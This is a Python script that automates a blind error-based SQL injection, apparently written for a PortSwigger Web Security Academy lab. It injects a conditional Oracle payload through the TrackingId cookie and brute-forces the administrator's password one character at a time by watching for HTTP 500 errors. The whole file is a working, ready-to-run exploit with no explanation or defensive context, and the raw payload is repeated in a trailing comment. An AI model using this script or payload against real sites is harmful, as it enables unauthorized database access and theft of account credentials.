import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Target URL
target_url = "https://YOUR-ID.web-security-academy.net/"
cookie_template = "YOUR-TRACKING-ID'||(SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
session_cookie = "YOUR-SESSION"

# All possible characters (a-z and 0-9)
characters = string.ascii_lowercase + string.digits

# Check response status code
def get_response_status(position, char):
    cookies = {
        "TrackingId": cookie_template.format(pos=position, char=char),
        "session": session_cookie
    }
    response = requests.get(target_url, cookies=cookies)
    return char, response.status_code

# Find best match for a given position
def find_char_for_position(position):
    status_codes = {}
    max_workers = min(5, len(characters))  # Reduce thread count
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(get_response_status, position, char): char for char in characters}
        
        for future in as_completed(futures):
            char, status_code = future.result()
            status_codes[char] = status_code

    best_match = max(status_codes, key=lambda char: status_codes[char] == 500)
    print(f"[!] Found character '{best_match}' for position {position} (status code: {status_codes[best_match]})")
    return best_match

# Password extraction
password = ""
for pos in range(1, 21):
    print(f"[*] Testing position {pos} [a-z0-9]")
    password += find_char_for_position(pos)

print(f"[+] Extracted password: {password}")






# '||(SELECT CASE WHEN SUBSTR(password,1,1)='c' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
